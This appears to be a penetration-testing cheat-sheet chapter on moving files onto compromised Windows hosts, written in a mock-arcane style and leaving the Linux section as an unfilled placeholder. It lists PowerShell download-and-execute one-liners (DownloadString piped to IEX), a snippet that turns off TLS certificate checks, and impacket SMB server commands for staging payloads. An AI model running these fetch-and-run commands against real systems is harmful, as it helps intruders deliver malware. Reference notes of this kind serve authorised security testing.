# 📁 File Transfers

In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.

> *"No summoning may begin until the runes are in place."*

---

<details>
  <summary><strong>Windows</strong></summary>

---

  <details>
    <summary><strong>PowerShell DownloadFile Method</strong></summary>

  Sync  
  ```powershell
  (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
  ```

  Async  
  ```powershell
  (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
  ```
  </details>

  <details>
    <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>

  Base  
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
  ```

  Pipeline input  
  ```powershell
  (New-Object Net.WebClient).DownloadString('<FILE URL>') | IEX
  ```
  </details>

  <details>
    <summary><strong>PowerShell Invoke-WebRequest</strong></summary>

  Base  
  ```powershell
  Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
  ```

  ByPass Internet Explorer Error  
  ```powershell
  Invoke-WebRequest <FILE URL> -UseBasicParsing | IEX
  ```

  ByPass SSL/TLS Error  
  ```powershell
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  # Command to download the file
  ```

  </details>

  <details>
    <summary><strong>SMB Downloads</strong></summary>

  **Base form**
  
  Create the SMB Server in Linux
  ```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare
  ```
  Download using CMD in Windows
  ```cmd
  copy \\<IP>\share\<FILE>
  ```
  
  **Using credentialts**

  Create the SMB Server in Linux
  ```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
  ```
  Mount the SMB Server in Linux
  ```cmd
  net use n: \\<IP>\share /user:<USER> <PASSWORD>
  copy n:\<FILE>
  ```

  </details>

---
</details>

---

<details>
  <summary><strong>Linux</strong></summary>

---

  <details>
    <summary><strong>TITLE</strong></summary>

    Contenido del subtema Linux.
  </details>

---
</details>
